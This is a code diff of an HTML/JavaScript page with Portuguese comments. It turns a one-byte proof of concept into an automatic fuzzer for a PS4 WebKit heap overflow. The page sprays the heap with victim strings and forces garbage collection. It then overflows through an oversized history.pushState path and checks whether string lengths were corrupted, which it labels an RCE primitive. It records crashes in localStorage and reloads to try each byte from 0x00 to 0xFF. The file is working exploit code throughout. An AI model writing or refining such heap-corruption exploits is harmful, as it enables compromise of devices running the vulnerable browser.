@@ -2,53 +2,113 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 WebKit: Magic Byte Hunter</title>
+    <title>PS4 WebKit Fuzzer (Persistent)</title>
     <style>
-        body { background-color: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
-        .success { color: #fff; background: #008800; padding: 10px; font-weight: bold; font-size: 1.5em; border: 2px solid #0f0;}
-        .fail { color: #888; }
-        button { font-size: 16px; padding: 10px; background: #333; color: white; border: 1px solid #666; cursor: pointer; margin: 5px; }
+        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
+        .box { border: 1px solid #444; padding: 10px; margin-bottom: 10px; }
+        .current { font-size: 1.5em; color: yellow; }
+        .crash { color: #f55; }
+        .safe { color: #888; }
+        .jackpot { color: #fff; background: #d00; font-weight: bold; padding: 5px; border: 2px solid #f00; }
+        button { padding: 10px 20px; cursor: pointer; background: #333; color: white; border: 1px solid #555; }
     </style>
 </head>
 <body>
 
-<h2>WebKit Heap: Magic Byte Hunter</h2>
-<p>Status: <span id="status">Ready</span></p>
+<h2>WebKit Heap Fuzzer (0x00 - 0xFF)</h2>
+<div class="box">
+    <p>Status Atual: <span id="status" class="current">Parado</span></p>
+    <p>Último Resultado: <span id="lastResult">Nenhum</span></p>
+    <button onclick="startFuzzing()">INICIAR / RETOMAR FUZZING</button>
+    <button onclick="resetFuzzing()">RESETAR PROGRESSO</button>
+</div>
 
-<label>Byte de Ataque (Hex): 0x</label>
-<input type="text" id="byteInput" value="80" style="width: 40px; font-size: 16px;">
-<br><br>
-
-<button onclick="runTest()">DISPARAR ATAQUE (1 Byte)</button>
-
-<div id="log" style="margin-top:20px;"></div>
+<h3>Histórico de Tentativas:</h3>
+<div id="log" style="height: 300px; overflow-y: scroll; border: 1px solid #333; padding: 5px; font-size: 12px;"></div>
 
 <script>
+    // --- CONFIGURAÇÃO DO EXPLOIT (Igual ao POC-Magic-Byte) ---
     const MB = 1024 * 1024;
     const VICTIM_SIZE = MB; 
     const SPRAY_COUNT = 512; 
     var victims = new Array(SPRAY_COUNT);
 
-    function log(msg, type="") {
+    // --- LÓGICA DE PERSISTÊNCIA ---
+    function logHistory(msg, color="white") {
         const el = document.getElementById('log');
-        el.innerHTML = `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>` + el.innerHTML;
+        el.innerHTML += `<div style="color:${color};">${msg}</div>`;
+        el.scrollTop = el.scrollHeight;
     }
 
-    function runTest() {
-        document.getElementById('log').innerHTML = "";
+    function saveState(byte, status) {
+        localStorage.setItem('fuzz_byte', byte);
+        localStorage.setItem('fuzz_status', status); // 'running', 'idle'
+    }
+
+    function appendLog(byte, result) {
+        let history = localStorage.getItem('fuzz_history') || "";
+        history += `[0x${byte.toString(16).toUpperCase().padStart(2,'0')}] ${result}|`;
+        localStorage.setItem('fuzz_history', history);
+    }
+
+    function loadHistory() {
+        let history = localStorage.getItem('fuzz_history') || "";
+        if(!history) return;
+        let entries = history.split('|');
+        entries.forEach(entry => {
+            if(entry.trim() === "") return;
+            let color = entry.includes("CRASH") ? "#f55" : "#888";
+            if(entry.includes("JACKPOT")) color = "#0f0";
+            logHistory(entry, color);
+        });
+    }
+
+    // --- LÓGICA PRINCIPAL ---
+    function init() {
+        loadHistory();
+        let savedByte = parseInt(localStorage.getItem('fuzz_byte'));
+        let savedStatus = localStorage.getItem('fuzz_status');
+
+        if (isNaN(savedByte)) savedByte = 0; // Começa do 0 se não tiver salvo
+
+        // SE O STATUS ESTAVA "running", SIGNIFICA QUE O NAVEGADOR FECHOU (CRASH)
+        if (savedStatus === 'running') {
+            document.getElementById('lastResult').innerHTML = `<span class="crash">CRASH DETECTADO em 0x${savedByte.toString(16).toUpperCase()}</span>`;
+            appendLog(savedByte, "CRASH (Browser Closed)");
+            logHistory(`Retomando após crash em 0x${savedByte.toString(16)}...`, "#f55");
+            
+            // Pula para o próximo byte
+            savedByte++;
+            saveState(savedByte, 'idle');
+        }
+
+        document.getElementById('status').innerText = `Pronto para testar 0x${savedByte.toString(16).toUpperCase()}`;
+    }
+
+    function startFuzzing() {
+        let currentByte = parseInt(localStorage.getItem('fuzz_byte')) || 0;
         
-        // Pega o byte escolhido pelo usuário
-        let byteStr = document.getElementById('byteInput').value;
-        let magicByte = parseInt(byteStr, 16);
-        
-        if (isNaN(magicByte) || magicByte < 0 || magicByte > 255) {
-            alert("Byte inválido! Use Hex (ex: 80, 41, 01)");
+        if (currentByte > 255) {
+            document.getElementById('status').innerText = "FUZZING CONCLUÍDO (0x00 - 0xFF)";
+            alert("Fuzzing Finalizado! Verifique o log.");
             return;
         }
 
-        let charPayload = String.fromCharCode(magicByte);
-        log(`Iniciando teste com Byte: 0x${byteStr} (${magicByte})...`);
+        // Marca como rodando (se fechar agora, saberemos que foi crash)
+        saveState(currentByte, 'running');
+        document.getElementById('status').innerText = `TESTANDO 0x${currentByte.toString(16).toUpperCase()}...`;
+        document.getElementById('status').className = "current crash"; // Vermelho enquanto roda
 
+        runExploit(currentByte);
+    }
+
+    function resetFuzzing() {
+        localStorage.clear();
+        location.reload();
+    }
+
+    // --- O EXPLOIT ---
+    function runExploit(magicByte) {
         // 1. SPRAY
         for (let i = 0; i < SPRAY_COUNT; i++) {
             let header = `ID:${i}-`; 
@@ -62,54 +122,73 @@
         }
         
         // GC Force
-        for(let k=0; k<200; k++) { new ArrayBuffer(0x20000); }
+        for(let k=0; k<150; k++) { new ArrayBuffer(0x20000); }
 
-        // 3. TRIGGER
+        // 3. TRIGGER (Com delay curto)
         setTimeout(() => {
             const SAFE_SIZE = 709522; 
             const BASE = "A".repeat(SAFE_SIZE);
-            const OVERFLOW = charPayload; // O Byte Mágico
+            const OVERFLOW = String.fromCharCode(magicByte); // BYTE MÁGICO
             
             const payload = "/" + BASE + OVERFLOW;
 
             try {
                 history.pushState({}, "poc", payload);
-                log("Payload enviado. Verificando...");
-                check(magicByte);
+                
+                // Se chegar aqui, não crashou imediatamente. Verifica sucesso.
+                setTimeout(() => checkSuccess(magicByte), 100);
             } catch(e) {
-                log("Erro: " + e.message);
+                // Erro de JS não é crash.
+                console.log(e);
             }
-        }, 1500);
+        }, 500);
     }
 
-    function check(sentByte) {
+    function checkSuccess(byte) {
         let found = false;
+        let jackpot = false;
+
         for (let i = SPRAY_COUNT - 200; i < SPRAY_COUNT; i++) {
             if (victims[i] !== null) {
                 let v = victims[i];
-                
-                // VERIFICAÇÃO 1: Tamanho Mudou? (Isso é o que queremos!)
                 if (v.length !== VICTIM_SIZE) {
-                    log(`⚡ JACKPOT! Vítima ID ${i} corrompida!`, "success");
-                    log(`Tamanho Antigo: ${VICTIM_SIZE}`, "success");
-                    log(`Tamanho Novo:   ${v.length}`, "success");
-                    log(`Byte usado: 0x${sentByte.toString(16)}`, "success");
-                    found = true;
-                    alert("RCE PRIMITIVE CONFIRMED!\nTire foto agora!");
+                    jackpot = true;
                     break;
-                }
-
-                // VERIFICAÇÃO 2: Conteúdo Mudou? (Menos provável com 1 byte no header, mas possível)
-                if (v.charCodeAt(0) !== 73) { // 73 é 'I' de ID:...
-                     log(`⚡ Conteúdo alterado na Vítima ${i}!`, "success");
-                     found = true;
-                     break;
                 }
             }
         }
-        
-        if (!found) log(`Sem mudança visível com 0x${sentByte.toString(16)}. Tente outro byte.`, "fail");
+
+        if (jackpot) {
+            // SUCESSO! PARE TUDO.
+            document.getElementById('status').innerHTML = "JACKPOT! RCE ENCONTRADO!";
+            document.getElementById('status').className = "jackpot";
+            appendLog(byte, "JACKPOT (Length Corrupted)!!!");
+            alert(`SUCESSO EM 0x${byte.toString(16)}! TIRE FOTO!`);
+            saveState(byte, 'idle'); // Tira do modo running para não pular se recarregar
+        } else {
+            // FALHA (Nada aconteceu)
+            // Loga, incrementa e recarrega
+            appendLog(byte, "Safe (No change)");
+            let next = byte + 1;
+            saveState(next, 'idle'); // Marca como idle antes de recarregar
+            
+            // Auto-Reload para o próximo
+            setTimeout(() => {
+                // Usa window.location.href para forçar refresh limpo
+                window.location.reload();
+            }, 500); // 0.5s delay para ver o log
+        }
     }
+
+    // Inicia lógica ao carregar
+    init();
+
+    // Auto-start se estava no meio do processo (opcional, mas bom pra loop)
+    // Descomente abaixo se quiser que ele comece sozinho ao abrir a página
+    if (localStorage.getItem('fuzz_byte') > 0 && localStorage.getItem('fuzz_status') === 'idle') {
+        setTimeout(startFuzzing, 1000);
+    }
+
 </script>
 </body>
 </html>
